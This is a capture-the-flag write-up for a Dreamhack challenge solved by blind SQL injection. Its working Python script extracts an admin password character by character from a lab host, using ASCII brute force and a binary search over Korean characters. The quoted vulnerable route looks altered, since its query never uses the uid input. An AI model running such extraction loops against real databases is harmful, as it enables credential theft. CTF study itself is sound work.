## Description
```python
@app.route('/', methods=['GET'])
def index():
    uid = request.args.get('uid', '')
    nrows = 0

    if uid:
        cur = mysql.connection.cursor()
        nrows = cur.execute(f"SELECT * FROM users WHERE uid=admin and substr(upw,1,1)=='D';")

    return render_template_string(template, uid=uid, nrows=nrows)
```
Just server tells us uids are existing or not.  

```sql
INSERT INTO users (uid, upw) values ('admin', 'DH{**FLAG**}');
INSERT INTO users (uid, upw) values ('guest', 'guest');
INSERT INTO users (uid, upw) values ('test', 'test');
```
Information of users table

flag is made for ascii and korean letters.
- we can use string library for ascii, string.digits+string.ascii_letters+string.punctuation
- we should use unicode for korean letters, 0xAC00 ~ 0xD7A3

And we should use Binary Search for korean letters.
## Vulnerability
Blind SQL Injection

## Exploit
```python
import requests
import string

url='http://host8.dreamhack.games:13272'

final_flag='DH{'

charset=string.digits+string.ascii_letters+string.punctuation
#ASCII SETTING

print('Start')
#BRUTE FORCE FOR ASCII

for i in range(4,40):
    print(f"{i} Sequence")
    found=False #SETTING FOR IF FINDING AT ASCII
    for char in charset:
        print(f"Current char = {char}")
        payload=f"admin' and substr(upw,{i},1)='{char}'#"      #WE MUST USE SINGLE QUARTER
        
        try:
            res=requests.get(url,params={'uid':payload},timeout=10)

            if 'exists' in res.text:
                final_flag+=char
                print(f'Current Status={final_flag}')
                found = True
                break
        except:
            continue

    if found:
        continue

    #BINARY SEARCH FOR KOREAN LETTERS
    low=0xAC00
    high=0xD7A3

    while low<=high:
        mid=(low+high)//2

        print(chr(low))
        payload=f"admin' and substr(upw,{i},1)>'{chr(mid)}'#"

        try:
            res=requests.get(url,params={'uid':payload}, timeout=10)
            if 'exists' in res.text:
                low=mid+1
            else:
                high=mid-1

        except:    #WE SHOULD JUDGE FOR TIMEOUT
            print('Timeout')
            break

    final_flag+=chr(low)    #LOW IS ANSWER WHEN STOPPED LOOP
    print(f"Current Status: {final_flag}")

print(final_flag)
print('End')
```
